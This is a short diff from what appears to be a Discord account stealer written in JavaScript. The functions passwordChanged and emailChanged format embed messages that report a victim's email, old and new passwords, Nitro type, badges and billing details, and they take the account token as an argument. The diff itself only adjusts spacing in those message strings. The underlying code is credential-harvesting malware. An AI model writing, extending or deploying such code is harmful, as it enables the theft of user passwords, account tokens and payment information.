@@ -704,12 +704,12 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `<:mail:1069997090266173500> Email: **${json.email}**\n<:blacklock:1069101792736051221> Old Password: **${oldpassword}**\n<:blacklock:1069101792736051221> New Password: **${newpassword}**`,
+            value: `<:mail:1069997090266173500> Email: **${json.email}**\n <:blacklock:1069101792736051221> Old Password: **${oldpassword}**\n <:blacklock:1069101792736051221> New Password: **${newpassword}**`,
             inline: true,
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
+            value: `<:blackarrow:1069101795827269632> Nitro Type: **${nitro}**\n <a:blackbadge:1069100354312093798> Badges: **${badges}**\n <a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
             inline: true,
           },
           {
@@ -752,7 +752,7 @@ const emailChanged = async (email, password, token) => {
           },
           {
             name: '**Discord Informtions**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:black_hypesquad:1095742323423453224> Badges: **${badges}**\n <a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n <a:black_hypesquad:1095742323423453224> Badges: **${badges}**\n <a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
